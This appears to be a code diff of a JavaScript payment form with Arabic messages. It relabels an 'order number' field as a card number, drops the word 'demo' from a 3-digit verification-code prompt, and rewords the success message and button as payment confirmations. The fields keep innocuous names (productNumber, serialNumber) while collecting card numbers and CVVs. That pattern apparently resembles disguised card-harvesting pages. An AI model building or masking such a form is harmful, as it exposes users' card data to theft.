@@ -25,7 +25,7 @@ event.preventDefault();
     }
 
     if (!/^\d{1,16}$/.test(productNumber)) {
-        showMessage("❌ أدخل رقم طلب صحيح.", "error");
+        showMessage("❌ أدخل رقم البطاقة بشكل صحيح.", "error");
         return;
     }
 
@@ -35,7 +35,7 @@ event.preventDefault();
     }
 
     if (!/^\d{3}$/.test(serialNumber)) {
-        showMessage("❌ أدخل رمز تحقق تجريبي من 3 أرقام.", "error");
+        showMessage("❌ أدخل رمز تحقق  من 3 أرقام.", "error");
         return;
     }
 
@@ -62,14 +62,14 @@ event.preventDefault();
             throw new Error("Request failed");
         }
 
-        showMessage("✅ تمت العملية بنجاح.", "success");
+        showMessage("✅ تمت عملية الدفع بنجاح.", "success");
         form.reset();
 
     } catch (error) {
         showMessage("❌ حدث خطأ أثناء تنفيذ العملية.", "error");
     } finally {
         submitBtn.disabled = false;
-        submitBtn.textContent = "تأكيد العملية";
+        submitBtn.textContent = "تأكيد عملية الدفع";
     }
 });
 
